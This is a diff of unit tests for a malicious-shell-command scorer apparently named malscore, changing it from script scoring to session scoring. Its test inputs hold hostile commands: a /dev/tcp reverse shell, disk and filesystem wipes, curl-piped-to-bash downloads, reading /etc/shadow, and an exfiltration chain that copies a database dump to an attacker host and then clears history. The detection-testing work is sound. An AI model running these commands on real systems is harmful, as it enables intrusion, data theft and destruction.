@@ -5,7 +5,7 @@ from __future__ import annotations
 import unittest
 
 import _bootstrap  # noqa: F401
-from malscore import SCRIPT_SIGNALS, SIGNALS, Analyzer, verdict_for
+from malscore import SESSION_SIGNALS, SIGNALS, Analyzer, verdict_for
 from malscore.features import extract_features
 
 
@@ -89,86 +89,93 @@ class ScoringTest(unittest.TestCase):
     def test_benign_commands_score_low(self) -> None:
         for command in ("ls -la", "git status", "kubectl get pods -n prod",
                         "sudo systemctl restart nginx", "docker ps", "pip install requests"):
-            assessment = self.analyzer.assess(command)
+            assessment = self.analyzer.assess_command(command)
             self.assertLess(assessment.score, 35, "%r scored %d" % (command, assessment.score))
 
     def test_reverse_shell_is_critical(self) -> None:
-        assessment = self.analyzer.assess("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
+        assessment = self.analyzer.assess_command("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
         self.assertGreaterEqual(assessment.score, 80)
         self.assertEqual(assessment.verdict, "critical")
 
     def test_destruction_is_critical(self) -> None:
-        self.assertGreaterEqual(self.analyzer.assess("rm -rf / --no-preserve-root").score, 80)
+        self.assertGreaterEqual(self.analyzer.assess_command("rm -rf / --no-preserve-root").score, 80)
 
     def test_curl_pipe_shell_is_flagged(self) -> None:
-        assessment = self.analyzer.assess("curl -s http://1.2.3.4/x.sh | bash")
+        assessment = self.analyzer.assess_command("curl -s http://1.2.3.4/x.sh | bash")
         self.assertGreaterEqual(assessment.score, 35)
         self.assertIn("download_pipe_interpreter", [h.id for h in assessment.hits])
 
     def test_score_is_bounded(self) -> None:
         big = "sudo bash -c \"curl http://1.2.3.4/x|bash; rm -rf /; dd if=/dev/zero of=/dev/sda\""
-        assessment = self.analyzer.assess(big)
+        assessment = self.analyzer.assess_command(big)
         self.assertLessEqual(assessment.score, 100)
         self.assertGreaterEqual(assessment.score, 0)
 
     def test_signal_catalogue_is_well_formed(self) -> None:
-        catalogue = SIGNALS + list(SCRIPT_SIGNALS.values())
+        catalogue = SIGNALS + list(SESSION_SIGNALS.values())
         self.assertEqual(len({s.id for s in catalogue}), len(catalogue))
         for signal in catalogue:
             self.assertTrue(0.0 < signal.weight <= 1.0, signal.id)
             self.assertTrue(signal.techniques, "%s has no technique" % signal.id)
 
     def test_techniques_surface_in_output(self) -> None:
-        assessment = self.analyzer.assess("cat /etc/shadow")
+        assessment = self.analyzer.assess_command("cat /etc/shadow")
         self.assertIn("T1003.008", assessment.techniques)
 
     def test_redaction_only_changes_echoed_text(self) -> None:
         command = "mysql --password=hunter2 -e 'select 1'"
-        plain = Analyzer().assess(command)
-        redacted = Analyzer(redact=True).assess(command)
+        plain = Analyzer().assess_command(command)
+        redacted = Analyzer(redact=True).assess_command(command)
         self.assertEqual(plain.score, redacted.score)
         self.assertNotIn("hunter2", redacted.command)
         self.assertIn("hunter2", plain.command)
 
 
-class ScriptScoringTest(unittest.TestCase):
+class SessionScoringTest(unittest.TestCase):
     @classmethod
     def setUpClass(cls) -> None:
         cls.analyzer = Analyzer()
 
-    def test_staged_exfiltration_detected_across_lines(self) -> None:
-        script = "\n".join([
-            "#!/bin/bash",
+    def test_staged_exfiltration_detected_across_commands(self) -> None:
+        assessment = self.analyzer.assess_session([
             "pg_dump payments > /tmp/dump.sql",
             "tar czf /tmp/stage.tgz /tmp/dump.sql /etc/app/config.yml",
             "scp /tmp/stage.tgz attacker@45.33.2.1:/loot/",
             "rm -f /tmp/stage.tgz",
             "history -c",
         ])
-        assessment = self.analyzer.assess(script)
         ids = [h.id for h in assessment.hits]
         self.assertIn("collect_then_exfiltrate", ids)
         self.assertIn("cover_tracks", ids)
         self.assertGreaterEqual(assessment.score, 60)
-        self.assertTrue(assessment.per_statement)
+        self.assertEqual(len(assessment.per_command), 5)
 
-    def test_heredoc_payload_is_scored(self) -> None:
-        script = "bash <<'SH'\ncurl -s http://1.2.3.4/a | sh\nSH"
-        assessment = self.analyzer.assess(script)
-        ids = [h.id for s in assessment.per_statement for h in s.hits]
-        self.assertIn("download_pipe_interpreter", ids)
+    def test_download_executed_by_later_command(self) -> None:
+        assessment = self.analyzer.assess_session([
+            "curl -s -o /tmp/p http://1.2.3.4/p",
+            "chmod 700 /tmp/p",
+            "/tmp/p --daemon",
+        ])
+        self.assertIn("staged_download_execution", [h.id for h in assessment.hits])
 
-    def test_benign_script_stays_low(self) -> None:
-        script = "\n".join([
-            "#!/bin/bash",
-            "set -euo pipefail",
+    def test_benign_session_stays_low(self) -> None:
+        assessment = self.analyzer.assess_session([
             "cd /srv/app",
             "git pull --ff-only",
             "npm ci",
             "npm run build",
             "systemctl restart app",
         ])
-        self.assertLess(self.analyzer.assess(script).score, 35)
+        self.assertLess(assessment.score, 35)
+
+    def test_blank_entries_skipped_and_positions_kept(self) -> None:
+        assessment = self.analyzer.assess_session(["id", "", "   ", "cat /etc/shadow"])
+        self.assertEqual([(c.line, c.command) for c in assessment.per_command],
+                         [(1, "id"), (4, "cat /etc/shadow")])
+
+    def test_empty_session(self) -> None:
+        assessment = self.analyzer.assess_session([])
+        self.assertEqual((assessment.score, assessment.verdict, assessment.per_command), (0, "benign", []))
 
 
 if __name__ == "__main__":
